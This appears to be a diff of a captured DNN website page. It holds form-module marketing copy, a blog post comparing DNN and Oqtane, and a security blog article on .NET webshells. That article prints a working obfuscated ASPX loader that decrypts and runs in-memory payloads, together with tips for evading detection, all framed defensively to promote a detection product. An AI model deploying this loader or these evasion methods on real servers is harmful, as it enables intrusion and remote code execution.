+      position:absolute;
+      left:0;
+      top:0;
+      color:var(--success);
+      font-weight:700;
+    }
+
+    .callout{
+      background:linear-gradient(135deg,#eff6ff 0%,#f5f3ff 100%);
+      border:1px solid #d7e5ff;
+      border-radius:18px;
+      padding:18px;
+      color:#334155;
+      margin-top:16px;
+    }
+
+    .steps{
+      display:grid;
+      grid-template-columns:repeat(5,1fr);
+      gap:14px;
+      margin-top:18px;
+    }
+
+    .step{
+      background:#fff;
+      border:1px solid var(--line);
+      border-radius:18px;
+      padding:18px;
+    }
+
+    .step-num{
+      width:34px;
+      height:34px;
+      border-radius:50%;
+      background:var(--soft);
+      color:var(--primary);
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      font-weight:700;
+      margin-bottom:12px;
+    }
+
+    .step h3{
+      margin:0 0 8px;
+      font-size:18px;
+      color:var(--dark);
+    }
+
+    .step p{
+      margin:0;
+      color:var(--muted);
+      font-size:15px;
+    }
+
+    .cta{
+      margin-top:22px;
+      background:linear-gradient(135deg,#0f172a 0%, #1e3a8a 100%);
+      color:#fff;
+      border-radius:24px;
+      padding:30px;
+      box-shadow:var(--shadow);
+    }
+
+    .cta h2{
+      margin:0 0 12px;
+      color:#fff;
+      font-size:34px;
+    }
+
+    .cta p{
+      color:rgba(255,255,255,.9);
+      font-size:17px;
+    }
+
+    @media (max-width: 980px){
+      .feature-grid,
+      .widget-grid,
+      .steps{
+        grid-template-columns:repeat(2,1fr);
+      }
+      .split{
+        grid-template-columns:1fr;
+      }
+      h1{font-size:38px}
+      .section-heading h2,
+      .cta h2{font-size:30px}
+    }
+
+    @media (max-width: 640px){
+      .feature-grid,
+      .widget-grid,
+      .steps{
+        grid-template-columns:1fr;
+      }
+      .hero{
+        padding:30px 20px;
+      }
+      .tab-content{
+        padding:24px 18px 28px;
+      }
+      h1{font-size:32px}
+      .section-heading h2,
+      .cta h2{font-size:26px}
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+
+    <section class="hero">
+      <div class="eyebrow">MegaForm for DNN</div>
+      <h1>Modern Forms, Workflow Automation, and Self-Hosted Control — All in One Platform</h1>
+      <p>
+        MegaForm helps transform your DNN portal into a modern form platform inspired by the ease of Typeform and Google Forms, while giving you far more control over workflows, integrations, branding, publishing, and data ownership.
+      </p>
+    </section>
+
+    <section class="tabs">
+      <input type="radio" name="tabs" id="tab1" checked>
+      <input type="radio" name="tabs" id="tab2">
+      <input type="radio" name="tabs" id="tab3">
+      <input type="radio" name="tabs" id="tab4">
+      <input type="radio" name="tabs" id="tab5">
+
+      <div class="tab-labels">
+        <label for="tab1">1. Blog Story</label>
+        <label for="tab2">2. Rich Widgets</label>
+        <label for="tab3">3. Workflow & Integrations</label>
+        <label for="tab4">4. Embedded & Portal Use</label>
+        <label for="tab5">5. AI + Self-Hosted Value</label>
+      </div>
+
+      <div class="content">
+
+        <!-- TAB 1 -->
+        <div class="tab-content" id="content1">
+          <div class="blog-card">
+            <div class="section-heading">
+              <h2>At Last, We Published the Form Platform We Wanted to Have</h2>
+              <p>
+                A more article-like introduction to why MegaForm matters.
+              </p>
+            </div>
+
+            <p class="lead">
+              For a long time, many teams loved the convenience of tools like Typeform and Google Forms, but they still wanted more. They wanted stronger control over branding, deeper workflow capabilities, better integration with databases and CRM systems, richer widgets, more flexibility in how forms are published, and most of all, real ownership of the collected data.
+            </p>
+
+            <p>
+              That is exactly why MegaForm matters. After a long journey of design, engineering, testing, refinement, and practical business thinking, we finally published a form platform that feels modern and easy to use while still giving organizations the control they need. MegaForm is designed to help DNN become much more than a CMS page with a few input fields. It can become a true form platform.
+            </p>
+
+            <p>
+              What makes this especially powerful is that MegaForm is flexible in how it is used. It can be used as a normal form module directly inside your own DNN portal, just like any standard form module. In that mode, forms become a natural part of your website, your business pages, and your portal experience. But MegaForm can also go beyond that role and act as a broader form server, allowing you to publish and embed forms for external audiences across landing pages, partner sites, campaign pages, or even WordPress websites.
+            </p>
+
+            <div class="quote">
+              In other words, MegaForm lets you start with simple portal-based forms and grow into a centralized, self-hosted form platform as your needs expand.
+            </div>
+
+            <p>
+              This is important because many organizations do not want their collected data to live on someone else’s server by default. They want the convenience of modern forms, but they also want self-hosted control, stronger integration options, and the confidence that their workflows belong to them. MegaForm gives them that option.
+            </p>
+
+            <p>
+              It is not just about collecting a few names and email addresses. MegaForm supports a much wider range of real-world scenarios: signatures, repeatable sections, uploads, spam protection, multi-step flows, appointment-like experiences, payment-ready journeys, conditional behavior, embedded publishing, and workflow automation into database operations, CRM processes, webhooks, and more. This makes it useful not only for public forms, but also for internal operations, intake workflows, service processes, registrations, approvals, and customer journeys.
+            </p>
+
+            <p>
+              Another major advantage is the role of AI assistance. Not every user wants to spend hours building layouts by hand or dealing with raw HTML and CSS. MegaForm is built with the idea that AI can help teams create better forms faster. Instead of starting from a blank page every time, organizations can use AI-assisted thinking and structured templates to move from idea to live form much more efficiently.
+            </p>
+
+            <p>
+              For teams that care about privacy, internal ownership, custom process integration, or long-term extensibility, that is a major strategic advantage. MegaForm gives you the ability to offer the kind of polished, workflow-ready form experience people expect from modern platforms, while keeping your infrastructure, your integration logic, and your collected data under your own control.
+            </p>
+          </div>
+        </div>
+
+        <!-- TAB 2 -->
+        <div class="tab-content" id="content2">
+          <div class="section-heading">
+            <h2>Rich Widgets That Go Far Beyond Basic Forms</h2>
+            <p>
+              MegaForm is not limited to plain text boxes. It supports a wide set of practical widgets needed by real organizations.
+            </p>
+          </div>
+
+          <div class="widget-grid">
+            <div class="widget">
+              <span class="widget-badge">Signature</span>
+              <h3>Capture Signatures with Confidence</h3>
+              <p>Use signature fields for consent forms, acknowledgments, approvals, agreements, and workflows where a visual sign-off matters.</p>
+            </div>
+
+            <div class="widget">
+              <span class="widget-badge">Repeater</span>
+              <h3>Repeatable Sections for Real Data Entry</h3>
+              <p>Add repeated entries for participants, products, services, dependents, invoice lines, items, or structured business records.</p>
+            </div>
+
+            <div class="widget">
+              <span class="widget-badge">CAPTCHA</span>
+              <h3>Protect Public-Facing Forms</h3>
+              <p>Reduce spam and abuse with CAPTCHA support for contact forms, lead forms, inquiry forms, and open public submissions.</p>
+            </div>
+
+            <div class="widget">
+              <span class="widget-badge">Upload</span>
+              <h3>Collect Files and Attachments</h3>
+              <p>Allow users to submit supporting documents, attachments, images, and files as part of the overall form process.</p>
+            </div>
+
+            <div class="widget">
+              <span class="widget-badge">Multi-step</span>
+              <h3>Create Guided Form Journeys</h3>
+              <p>Break long forms into better experiences with sections, page breaks, wizard-style flows, and more controlled progression.</p>
+            </div>
+
+            <div class="widget">
+              <span class="widget-badge">Conditional Rules</span>
+              <h3>Show the Right Fields at the Right Time</h3>
+              <p>Build smarter forms that adapt to user input, reveal only relevant questions, and keep the experience cleaner.</p>
+            </div>
+
+            <div class="widget">
+              <span class="widget-badge">Appointment</span>
+              <h3>Support Scheduling Scenarios</h3>
+              <p>Build form journeys for consultations, reservations, booking requests, time slots, or service scheduling workflows.</p>
+            </div>
+
+            <div class="widget">
+              <span class="widget-badge">Payment</span>
+              <h3>Payment-Ready Form Experiences</h3>
+              <p>Support scenarios where payment becomes part of the form process, helping forms move closer to real transactions.</p>
+            </div>
+          </div>
+
+          <div class="callout">
+            MegaForm also includes the practical building blocks teams expect every day: text, email, phone, number, textarea, select, checkbox, radio, date, content blocks, sections, and structured layouts for polished forms.
+          </div>
+        </div>
+
+        <!-- TAB 3 -->
+        <div class="tab-content" id="content3">
+          <div class="section-heading">
+            <h2>Workflow Engine and Business Integrations</h2>
+            <p>
+              A form should do more than collect data. MegaForm helps submissions move into real business processes.
+            </p>
+          </div>
+
+          <div class="feature-grid">
+            <div class="feature">
+              <div class="icon">DB</div>
+              <h3>Database Integration</h3>
+              <p>Use submitted form data as part of database-oriented workflows and operational storage processes.</p>
+            </div>
+
+            <div class="feature">
+              <div class="icon">CRM</div>
+              <h3>CRM-Oriented Flows</h3>
+              <p>Move leads, requests, and customer interactions into broader CRM processes instead of manual copying.</p>
+            </div>
+
+            <div class="feature">
+              <div class="icon">WH</div>
+              <h3>Webhook Automation</h3>
+              <p>Send events and payloads to external services or custom endpoints for integration and orchestration.</p>
+            </div>
+
+            <div class="feature">
+              <div class="icon">WF</div>
+              <h3>Operational Workflow</h3>
+              <p>Trigger approvals, notifications, follow-up actions, and internal business routing after submission.</p>
+            </div>
+          </div>
+
+          <div class="split">
+            <div class="card">
+              <h3>From Form Submission to Action</h3>
+              <p>
+                MegaForm is built so that a form submission does not have to end as an email notification sitting in an inbox. Instead, it can become the start of something more meaningful: a business process, a CRM action, a database operation, an external trigger, or an internal decision flow.
+              </p>
+              <ul class="checklist">
+                <li>Send data into structured systems</li>
+                <li>Trigger business automation after submit</li>
+                <li>Support operational workflows, not just data capture</li>
+                <li>Connect forms to the real movement of work</li>
+              </ul>
+            </div>
+
+            <div class="card">
+              <h3>Why This Matters</h3>
+              <p>
+                Many form tools are convenient, but they stop at collection. MegaForm is designed to support the next step as well. That is what makes it useful for registrations, intake, internal processes, lead handling, approvals, service workflows, and customer journeys.
+              </p>
+              <div class="quote">
+                MegaForm helps forms become part of your process, not just a place where information gets stored.
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- TAB 4 -->
+        <div class="tab-content" id="content4">
+          <div class="section-heading">
+            <h2>Use It Inside Your Portal or As a Broader Form Server</h2>
+            <p>
+              MegaForm is flexible enough to work as a normal form module or as a larger publishing platform for wider audiences.
+            </p>
+          </div>
+
+          <div class="split">
+            <div class="card">
+              <h3>Use MegaForm Like a Normal Form Module</h3>
+              <p>
+                MegaForm can be used directly inside your own DNN portal, just like a standard form module. This gives you a fast and professional way to publish forms naturally as part of your portal, business pages, intranet, or customer-facing site.
+              </p>
+              <ul class="checklist">
+                <li>Portal-based contact forms</li>
+                <li>Registration and request forms</li>
+                <li>Internal operational forms</li>
+                <li>Department or workflow-specific pages</li>
+              </ul>
+            </div>
+
+            <div class="card">
+              <h3>Use MegaForm As a Form Server</h3>
+              <p>
+                MegaForm can also act as a broader self-hosted form server. In that model, you manage forms centrally and publish them beyond your main portal, reaching other websites, landing pages, campaigns, partner channels, and external audiences.
+              </p>
+              <ul class="checklist">
+                <li>Embedded forms for external sites</li>
+                <li>Landing page and campaign publishing</li>
+                <li>WordPress and external audience scenarios</li>
+                <li>One engine, many publishing channels</li>
+              </ul>
+            </div>
+          </div>
+
+          <div class="callout">
+            This means you can begin with simple portal forms today and grow into a centralized, self-hosted form platform tomorrow without changing the core direction of your solution.
+          </div>
+        </div>
+
+        <!-- TAB 5 -->
+        <div class="tab-content" id="content5">
+          <div class="section-heading">
+            <h2>AI-Assisted Building and the Value of Self-Hosted Control</h2>
+            <p>
+              MegaForm combines the convenience of modern form tools with the ownership and extensibility serious organizations need.
+            </p>
+          </div>
+
+          <div class="steps">
+            <div class="step">
+              <div class="step-num">1</div>
+              <h3>Describe</h3>
+              <p>Start from the business goal, not from raw HTML and CSS.</p>
+            </div>
+            <div class="step">
+              <div class="step-num">2</div>
+              <h3>Design</h3>
+              <p>Use AI-assisted thinking, templates, and structured layouts to shape the experience faster.</p>
+            </div>
+            <div class="step">
+              <div class="step-num">3</div>
+              <h3>Publish</h3>
+              <p>Render forms in your portal or publish them out to wider external audiences.</p>
+            </div>
+            <div class="step">
+              <div class="step-num">4</div>
+              <h3>Automate</h3>
+              <p>Connect form submissions to workflows, database actions, CRM flows, and webhooks.</p>
+            </div>
+            <div class="step">
+              <div class="step-num">5</div>
+              <h3>Own</h3>
+              <p>Keep your infrastructure, your branding, your workflow logic, and your data under your control.</p>
+            </div>
+          </div>
+
+          <div class="cta">
+            <h2>More Than a Form Builder</h2>
+            <p>
+              MegaForm is built for organizations that want the polished experience people expect from modern form platforms, but do not want to give up control over their branding, publishing model, workflow logic, or collected data.
+            </p>
+            <p>
+              For teams that care about privacy, internal ownership, custom process integration, or long-term extensibility, that is a major strategic advantage. MegaForm gives you the ability to offer modern, workflow-ready forms while keeping your infrastructure, your integration logic, and your collected data under your own control.
+            </p>
+            <p>
+              MegaForm can be used as a normal form module within your own portal, or as a centralized form server for publishing forms to a wider external audience. That flexibility is what makes it such a strong foundation for DNN-based form experiences.
+            </p>
+          </div>
+        </div>
+
+      </div>
+    </section>
+
+  </div>
+</body>
+</html>
+</div>
+
+</div><!-- End_Module_420 --></div>
+</div></div>
+    <div id="dnn_ContentPane" class="aperture-content-pane"><div class="DnnModule DnnModule-DNN_HTML DnnModule-410 DnnVersionableControl"><a name="410"></a><div id="dnn_ctr410_ContentPane"><!-- Start_Module_410 --><div id="dnn_ctr410_ModuleContent" class="DNNModuleContent ModDNNHTMLC">
+	<div id="dnn_ctr410_HtmlModule_lblContent" class="Normal">
+	<h1>DNN and Oqtane</h1>
+
+<p>I&#39;ve been working with <strong>DNN Platform</strong> (DotNetNuke) since the very early versions &ndash; it&#39;s familiar, powerful, and &quot;does everything.&quot; Recently, I&#39;ve also spent a lot of time with <strong>Oqtane</strong> &ndash; the &quot;spiritual successor&quot; from the same creator, Shaun Walker. After multiple large and small projects, here are my honest, no-fluff thoughts to help those of you who are still deciding.</p>
+
+<h2>1. DNN: The Reliable &quot;Big Brother&quot; &ndash; Does Everything, Super Familiar</h2>
+
+<p>DNN really can handle almost anything. Modules? Thousands available &ndash; membership management, events, e-commerce, ERP integrations, industry-specific ones (real estate, hospitals, schools...). Skins? Ready-made, beautiful, responsive for years. The admin panel is so familiar that you know exactly what to do just by looking.</p>
+
+<p>I used to think DNN was too legacy-heavy (WebForms, old postbacks, lower performance compared to modern stacks). But recent BuiltWith data (early 2026) shows ~48,000&ndash;49,000 live sites, with signs of slight growth again. Why?</p>
+
+<ul>
+ <li>DNN 10.x updates (especially 10.0 to 10.2.x) have improved a lot: removed legacy APIs, better .NET Framework 4.8 support, JWT/API tokens, smoother content approval, constant security fixes.</li>
+ <li>Many enterprise and government sites have run DNN stably for 10&ndash;15 years &ndash; low maintenance cost, familiar team.</li>
+ <li>Commercial module ecosystem is still alive; many providers continue selling high-quality DNN modules.</li>
+</ul>
+
+<p>In short: DNN isn&#39;t &quot;Old guy&quot; as some AIs think. It&#39;s like an old reliable truck that&#39;s been upgraded with a new engine, next to a super market with full of goods&ndash; still great for long hauls.</p>
+
+<h2>2. Oqtane: Lightweight, Blazing Fast, Modern &ndash; But Ecosystem Still &quot;Young&quot;</h2>
+
+<p>Oqtane is completely different: full <strong>Blazor</strong> (.NET 8/9/10), SPA experience (no page reloads), incredibly fast page loads (especially Blazor Server + prerendering). Code is clean, modular just like old DNN philosophy: plug-and-play modules, multi-tenant, easy to extend.</p>
+
+<p>I&#39;ve tested small projects: really quick deploy and fast on same hosting account, I am sure it can work with any hosting providers, sql.. . The admin panel is simpler than DNN but get improved &ndash; true plug-and-play feel.</p>
+
+<p>Real talk though:</p>
+
+<ul>
+ <li>Available modules are still limited (mostly core + some high-quality community ones).</li>
+ <li>Themes/skins aren&#39;t as rich or varied as DNN&#39;s.
+ <ul>
+  <li>Blazor is currently the best technology anounced by Microsoft --&gt; that&#39;s why.</li>
+ </ul>
+ </li>
+ <li>For complex features right away (advanced membership, full e-commerce), you&#39;ll need to build or wait &ndash; more time than DNN.</li>
+</ul>
+
+<h2>3. Our Team&#39;s Conclusion: Run Both in Parallel &ndash; But With Eyes on the Future</h2>
+
+<p>After careful evaluation (and checking recent forum activity):</p>
+
+<ul>
+ <li>DNN is very comfotable for building portal, documents management, pemissions based.</li>
+ <li>Anything <strong>running well on DNN</strong> (large legacy sites, existing clients, ready modules) . Upgrade to DNN 10.x for security and performance stability. No rush to migrate if there&#39;s no urgent reason.</li>
+ <li>But for <strong>all new projects</strong> (2026 onward) &rarr; prioritize <strong>Oqtane</strong>. Reasons: modern tech, Blazor is hot and sound so promising,&nbsp;high performance, long-term future-proof (.NET 10 LTS until 2028). We&#39;re building shared core modules (auth, multi-tenant, content) to reuse across both, and migrate gradually when needed.</li>
+</ul>
+
+<p>We still love DNN &ndash; deeply. It&#39;s given us so much over the years: stability, ecosystem, familiarity. But from what we&#39;ve seen on the forums and in the broader .NET community, even though we love DNN, we also love <strong>Oqtane</strong> for carrying forward the same modular, developer-friendly spirit &ndash; just rebuilt for today&#39;s world (Blazor, SPA, cross-platform potential).</p>
+
+<p>This dual approach lets us:</p>
+
+<ul>
+ <li>Retain old flatform (stable).</li>
+ <li>Prepare for the future (performance, mobile hybrid, cloud-native) and dont have to look elsewhere: WP, Umbraco....</li>
+ <li>All tools we have.</li>
+</ul>
+
+<h2>Update 2026: What Our Team Is Actually Building to Bridge DNN and Oqtane</h2>
+
+<p>Many of you asked: &quot;So what is your team concretely doing to support the transition?&quot; Here&#39;s the real update (March 2026).</p>
+
+<ol>
+ <li><strong>Tool to Convert DNN Skins for Use on Oqtane</strong><br />
+ Our biggest (and most challenging) ongoing project. DNN skins are typically .ascx files with server controls, Token replacements, skin objects, and inline Razor/VB, C#, HTML/CSS mixes. Oqtane themes are pure Blazor Razor components (.razor files) + CSS/JS, using Layout.razor, Pane components, and dynamic rendering via Cascading parameters.<br />
+ Currently in internal beta. Goal: public release (low-cost) soon.</li>
+ <li><strong>Form Module That Runs Seamlessly on Both Platforms</strong><br />
+ We built an <strong>Advanced Form Builder</strong> from scratch.<br />
+ - Native on DNN and 100% on Oqtane.<br />
+ - Shared codebase: validation, submissions, emails, integrations.<br />
+ - Multi-tenant, conditional fields, file uploads, captcha, anti-spam.<br />
+ Already live for several clients; great feedback on speed and UX.</li>
+ <li><strong>MegaMenu: About to Release!</strong><br />
+ MegaMenu is essential for large sites.<br />
+ - Finalizing a <strong>MegaMenu module</strong> for Oqtane (with DNN compatible version).<br />
+ - Features: Drag-drop builder, icons support, mega dropdown columns, mobile responsive.<br />
+ - Planned: Q2 2026 (possibly sooner).</li>
+ <li><strong>Our Iron Rule: 12+ High-Quality Modules per Year &ndash; No Junk</strong><br />
+ Team commitment:<br />
+ - Only high-quality: clean code, documented, tested, secure.<br />
+ - No low-value or buggy modules.<br />
+ - Target: 12+ per year, focused on real enterprise needs.<br />
+ All aim for cross-compatibility between DNN &amp; Oqtane.</li>
+</ol>
+
+<h2>Final Thoughts</h2>
+
+<p>We haven&#39;t abandoned DNN &ndash; we still maintain legacy sites and appreciate everything it has built. But with quieter forums and shifting community energy, we&#39;re excited to embrace Oqtane as the natural evolution.</p>
+
+<p>If you&#39;re on DNN and worried about the future: Follow our skin converter tool and cross-platform modules. We&#39;re happy to share beta/tests (comment or DM me)!</p>
+
+<p>What do you think of this direction? Which module would you like us to build next? 😊</p>
+
+<p><em>#dotnet #blazor #oqtane #dnn #cms #aspnetcore #moduledevelopment #migration</em></p>
+
+</div>
+
+</div><!-- End_Module_410 --></div>
+</div><div class="DnnModule DnnModule-Blog DnnModule-404"><a name="404"></a><div id="dnn_ctr404_ContentPane"><!-- Start_Module_404 --><div id="dnn_ctr404_ModuleContent" class="DNNModuleContent ModBlogC">
+	
+
+<div id="dnn_ctr404_Blog_ctlManagement_pnlManagement" style="height:40px" class="blog_manage_buttons">
+ 
+ 
+ 
+ 
+ &nbsp;
+ <div style="float:right">
+  
+  <a href="https://dnndefender.com/Blogs" id="homelink" title="Home"><i class="fa fa-home fa-fw icon16"></i>&nbsp;<span class="sr-only">Home</span></a>
+  
+  <a href="/DesktopModules/Blog/API/RSS/Get?tabid=39&moduleid=404&blog=5" id="rsslink404" title="RSS" target="_blank"><i class="fa fa-rss fa-fw icon16"></i>&nbsp;<span class="sr-only">RSS</span></a>
+  <a href="#" id="searchlink404" title="Search"><i class="fa fa-search fa-fw icon16"></i>&nbsp;<span class="sr-only">Search</span></a>
+ </div>
+</div>
+
+<script>
+(function ($, Sys) {
+ $(document).ready(function () {
+
+  var $dialogSearch = $('<div class="dnnDialog"></div>')
+		.html('<input type="text" id="txtSearch" style="width:95%"></input><br/>Search In: &nbsp;<input type="checkbox" id="scopeAll404" value="1" checked="1" />In all content<input type="checkbox" id="scopeTitle404" value="1" checked="1" />Title<input type="checkbox" id="scopeContents404" value="1" />Contents')
+		.dialog({
+		 autoOpen: false,
+		 resizable: false,
+		 dialogClass: 'dnnFormPopup dnnClear',
+		 title: 'Search',
+		 height: 210,
+		 width: 500,
+		 open: function (e) {
+		  $('.ui-dialog-buttonpane').find('button:contains("Search")').addClass('dnnPrimaryAction');
+		  $('.ui-dialog-buttonpane').find('button:contains("Cancel")').addClass('dnnSecondaryAction');
+		 },
+		 buttons: [
+    {
+     text: 'Cancel',
+     click: function () {
+      $(this).dialog("close");
+     }
+    },
+    {
+     text: 'Search',
+     click: function () {
+      $(this).dialog("close");
+      var url
+      if ($('#scopeAll404').is(':checked')) {
+       url = 'https://dnndefender.com/Blogs?';
+      } else {
+       url = 'https://dnndefender.com/Blogs/Blog/5?';
+      }
+      url += 'search=' + $('#txtSearch').val();
+      if ($('#scopeTitle404').is(':checked')) {
+       url += '&t=1'
+      }
+      if ($('#scopeContents404').is(':checked')) {
+       url += '&c=1'
+      }
+      if ($('#chkUnpublished404').is(':checked')) {
+       url += '&u=1'
+      }
+      window.location.href = encodeURI(url);
+     }
+    }
+    ]
+		});
+  $('#searchlink404').click(function () {
+   $dialogSearch.dialog('open');
+   return false;
+  });
+
+ });
+} (jQuery, window.Sys));
+</script>
+
+
+<div id="blogServiceErrorBox404"></div>
+
+
+<div class="blog-main-content">
+  <span class="removeselection"><a href="" title="Back"><i class="fa fa-arrow-up icon16"></i></a></span>
+  <article id="post-186" class="bbs-article">
+    <header>
+      <div class="supertitle"></div>
+      <h1>Modern Webshells 2024–2026: Minimal C# Loader Techniques with Encrypted Payloads from C2 and How They Bypass Detection</h1>
+    </header>
+    
+    <div class="content">
+      <div class="metadata">
+        <div class="share-buttons">
+          <h5>Share</h5>
+          <div id="sharrre" data-url="https://dnndefender.com/Blogs/Post/186/Modern-Webshells-2024-2026-Minimal-C-Loader-Techniques-with-Encrypted-Payloads-from-C2-and-How-They-Bypass-Detection" data-text="share"></div>
+        </div>
+        <div class="author">
+          <h5>Written By</h5>
+          <a href="https://dnndefender.com/Blogs?author=1">SuperUser Account</a>
+          
+        </div>
+        <div class="tags">
+          <h5>Tags</h5>
+          
+          
+        </div>
+        <div class="time">
+          <div data-time="2026-02-12 19:19:00" class="momentabs">2026-02-12</div>
+        </div>
+
+      </div>
+      <div class="body">
+        <p>In today&rsquo;s cybersecurity landscape, webshells have evolved far beyond the simple scripts of the past (such as China Chopper). From 2024 to 2026, attackers have become increasingly sophisticated&mdash;particularly in .NET/C# environments. Instead of large, obvious backdoors, they now deploy minimal loader-style components that retrieve encrypted content from Command &amp; Control (C&amp;C) infrastructure, execute primarily in memory, and leave very limited forensic traces.</p>
+
+<p>Today, we will examine one of the detection capabilities that the DNNDefender module is designed to provide&mdash;specifically, the types of stealth techniques that are often overlooked by traditional antivirus engines or hosting-level firewalls. While AV solutions typically rely on signatures and generic heuristics, and hosting firewalls focus on network-layer filtering, modern loader-based implants often operate within legitimate IIS and .NET execution flows, making them far harder to identify.</p>
+
+<p>This article explores how these patterns work at a high level, why they evade conventional defenses, and how targeted application-layer monitoring within the DNN ecosystem can significantly improve visibility and detection accuracy.</p>
+<!-- Image 1 Placeholder -->
+
+<h2>1. What Are Modern Webshells? Trends in 2024-2026</h2>
+
+<p>Webshells are malicious scripts or files uploaded to web servers, enabling remote code execution (RCE). According to recent reports from Microsoft Security and Trend Micro:</p>
+
+<ul>
+ <li>Deep integration with IIS/Windows &rarr; easy to disguise as legitimate files (.aspx, .ashx).</li>
+ <li>Memory-only execution &rarr; no disk writes, evading file-based AV detection.</li>
+ <li>Encrypted communication &rarr; payloads from C&amp;C are AES/RSA-encrypted, decrypted only in memory.</li>
+ <li>Used by APT groups &rarr; such as Earth Alux (China-nexus) in espionage campaigns (2025 reports).</li>
+</ul>
+<!-- Image 2 Placeholder -->
+
+ 
+<h2>2. Core Technique: Minimal C# Loader Downloading Encrypted Payloads from C&amp;C</h2>
+
+<p>Modern webshells are often tiny ASPX/ASHX files acting purely as loaders: they receive an encrypted parameter from the request, decrypt it, load an assembly via reflection, and execute the payload without writing to disk.</p>
+
+<h3>Simple Sample of Minimal Code (Obfuscated Loader)</h3>
+
+<pre>
+<code>&lt;%@ Page Language=&quot;C#&quot; %&gt;
+&lt;%@ Import Namespace=&quot;System.Reflection&quot; %&gt;
+&lt;%@ Import Namespace=&quot;System.Security.Cryptography&quot; %&gt;
+&lt;script runat=&quot;server&quot;&gt;
+void Loader() {
+    string enc = Request[&quot;p&quot;];
+    if (string.IsNullOrEmpty(enc)) return;
+    byte[] key = new byte[] { /* random 32-byte key */ }; // Hard-coded key
+    byte[] iv = new byte[] { /* random 16-byte IV */ };
+    byte[] data = Convert.FromBase64String(enc);
+    using (Aes aes = Aes.Create()) {
+        aes.Key = key; aes.IV = iv;
+        ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, aes.IV);
+        using (MemoryStream ms = new MemoryStream()) {
+            using (CryptoStream cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Write)) {
+                cs.Write(data, 0, data.Length); cs.FlushFinalBlock();
+            }
+            byte[] payload = ms.ToArray();
+            Assembly.Load(payload).GetTypes()[0].GetMethod(&quot;Run&quot;).Invoke(null, null);
+        }
+    }
+}
+// Junk code for obfuscation
+protected string junk1 = &quot;randomstr&quot;;
+protected int junk2 = 123;
+protected void Page_Load(object sender, EventArgs e) { Loader(); }
+&lt;/script&gt;</code></pre>
+
+<p><strong>How it works:</strong></p>
+
+<ol>
+ <li>Attacker sends: <code>http://victim.com/shell.aspx?p=[base64_encrypted_payload]</code></li>
+ <li>Code decrypts AES (key/IV hard-coded or dynamic).</li>
+ <li>Loads payload as an in-memory assembly (no file creation).</li>
+ <li>Invokes the <code>Run</code> method (backdoor, data exfil, ransomware deployment, etc.).</li>
+</ol>
+<!-- Image 3 Placeholder -->
+
+<h2>3. Bypass Detection: How They Evade AV/EDR</h2>
+
+<p>Simply relying on regex patterns to detect calls like <code>Assembly.Load</code> is far from sufficient in practice. Modern attackers frequently fragment and obfuscate these strings&mdash;such as splitting them into concatenated parts (<code>&quot;Syst&quot; + &quot;em.Ref&quot; + &quot;lection.Ass&quot; + &quot;embly.Load&quot;</code>), using Unicode escapes (<code>\u0053\u0079\u0073\u0074\u0065\u006d...</code>), or dynamically building them from byte arrays or environment variables&mdash;as documented in numerous recent reports (e.g., Microsoft Security Blog 2025, Fortinet analysis of ToolShell variants, and Cyfirma 2025). These techniques easily evade basic static regex-based scanning.</p>
+
+<p>In contrast, <strong>DNNDefender</strong> has been specifically optimized for these sophisticated threats. By combining advanced AI-driven analysis, AST (Abstract Syntax Tree) parsing, complex rule sets, and behavioral heuristics, it can detect even heavily obfuscated reflection patterns and in-memory assembly loading that pure regex would miss. Real-world testing has shown DNNDefender consistently outperforms traditional signature-based approaches in identifying modern .NET webshells and loaders.</p>
+
+<ul>
+ <li><strong>Obfuscation:</strong> Repeated junk code, string encryption, or tools like ConfuserEx.</li>
+ <li><strong>Fileless Execution:</strong> Fully in-memory &rarr; bypasses file scanners.</li>
+ <li><strong>Legitimate APIs:</strong> Relies on Reflection + Cryptography (avoids direct Process.Start hooks).</li>
+ <li><strong>Encrypted Traffic:</strong> HTTPS + custom encryption from C&amp;C mimics legitimate traffic.</li>
+ <li><strong>Persistence:</strong> Registers as IIS module or hooks global.asax for reload on every request.</li>
+</ul>
+
+<h2>4. Long-Term Persistence on Servers</h2>
+
+<ul>
+ <li>Disguised as legitimate files (e.g., error.aspx in module folders).</li>
+ <li>Memory-resident in IIS worker processes (w3wp.exe).</li>
+ <li>Creates scheduled tasks or registry hooks.</li>
+ <li>Enables lateral movement to internal servers.</li>
+</ul>
+<!-- Image 4 Placeholder -->
+
+ 
+<div class="conclusion">
+<h2>Conclusion: Detection and Defense Strategies</h2>
+
+<p><strong>Modern webshells are extremely difficult to detect, but effective defense is possible with a layered strategy:</strong></p>
+
+<ul>
+ <li><strong>Leverage strong specialized tools</strong> like <strong>DNNDefender</strong>, which in real-world testing has proven highly effective at catching modern .NET webshells and loaders. Combine it with complementary methods such as YARA rules focused on reflection patterns, in-memory execution signatures, or enterprise EDR solutions (CrowdStrike, Microsoft Defender for Endpoint) for broader coverage.</li>
+ <li><strong>Monitor IIS logs closely</strong> for suspicious patterns (e.g., unusual parameters like ?p=, base64-heavy requests, or unexpected POSTs to .aspx/.ashx files), enforce strict file upload restrictions, and apply timely patches for .NET and IIS vulnerabilities.</li>
+ <li><strong>Continuously validate and improve</strong> your defenses by regularly testing with real-world encrypted samples (password-protected archives containing modern variants) to fine-tune detection rules and reduce false negatives.</li>
+</ul>
+
+<p><strong>Stay vigilant!</strong></p>
+</div>
+
+<p>References: Microsoft Security Blog, Trend Micro Reports, Sygnia, Cyfirma (2025).</p>
+
+<p>This article is for educational and research purposes in cybersecurity only.</p>
+
+      </div>
+    </div>
+  </article>
+</div>
+
+
+
+
+</div><!-- End_Module_404 --></div>
+</div></div> 
+    <div id="dnn_FluidPane" class="DNNEmptyPane"></div>
+  </main>
+
+  <!-- Footer -->
+  <footer class="aperture-footer">
+  <div class="aperture-container">
+        <div class="footer-left">
+          <div class="footer-menu">
+            <ul class="desktop-menu h-100" id="nav-footer">
+            <li class="">
+            <a href="https://dnndefender.com/" >DNNDEFENDER</a>
+        </li>
+        <li class="">
+            <a href="https://dnndefender.com/Demo-Defender" >Demo Defender</a>
+        </li>
+        <li class="selected">
+            <a href="https://dnndefender.com/Blogs" >Blogs</a>
+        </li>
+        <li class="">
+            <a href="https://dnndefender.com/acmecorp" >ACME SKINS SYSTEM</a>
+        </li>
+        <li class="">
+            <a href="https://dnndefender.com/MegaForm" >MegaForm</a>
+        </li>
+
+</ul>
+
+
+          </div>
